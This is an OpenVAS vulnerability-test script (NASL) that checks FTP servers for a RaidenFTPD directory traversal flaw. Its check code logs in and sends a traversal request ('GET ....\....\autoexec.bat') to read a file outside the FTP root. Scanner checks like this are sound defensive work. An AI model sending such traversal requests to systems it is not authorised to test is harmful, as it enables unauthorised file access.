# OpenVAS Vulnerability Test
# $Id: raidenftpd_dir_traversal.nasl 8023 2017-12-07 08:36:26Z teissa $
# Description: RaidenFTPD Directory Traversal flaw
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
#
# Copyright:
# Copyright (C) 2005 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote host is running the RaidenFTPD FTP server.

The remote version of this software is vulnerable to a directory traversal flaw.
A malicious user could exploit it to gain read and write access to the outside 
of the intended ftp root.";

tag_solution = "Upgrade to 2.1 build 952 or newer";

#  Ref: joetesta@hushmail.com 

if(description)
{
 script_id(18224);
 script_version("$Revision: 8023 $");
 script_tag(name:"last_modification", value:"$Date: 2017-12-07 09:36:26 +0100 (Thu, 07 Dec 2017) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(2655);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

 name = "RaidenFTPD Directory Traversal flaw";

 script_name(name);
 

 
 script_category(ACT_GATHER_INFO);
  script_tag(name:"qod_type", value:"remote_vul");
  
 script_copyright("This script is Copyright (C) 2005 David Maciejak");
 family = "FTP";
 script_family(family);
 script_dependencies("find_service.nasl", "secpod_ftp_anonymous.nasl",
 		    "ftpserver_detect_type_nd_version.nasl");
 script_require_keys("ftp/login");
 script_require_ports("Services/ftp", 21);
 
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

#
# The script code starts here
#

include("ftp_func.inc");
port = get_kb_item("Services/ftp");
if(!port)port = 21;

login = get_kb_item("ftp/login");
password = get_kb_item("ftp/password");

if ( !login || ! password ) exit(0);


if(get_port_state(port))
{
 banner = get_ftp_banner(port: port);
 if ( ! banner ) exit(0);
 if (!egrep(pattern:".*RaidenFTPD.*", string:banner))exit(0);
 soc = open_sock_tcp(port);
 if(soc)
 {
	ftp_recv_line(socket:soc);
       if(ftp_authenticate(socket:soc, user:login, pass:password))
	      {
   		s = string("GET ....\....\autoexec.bat\r\n");
   		send(socket:soc, data:s);
   		r = ftp_recv_line(socket:soc);
		if ("150 Sending " >< r) security_message(port);
	      }
       close(soc);
  }
}
exit(0);
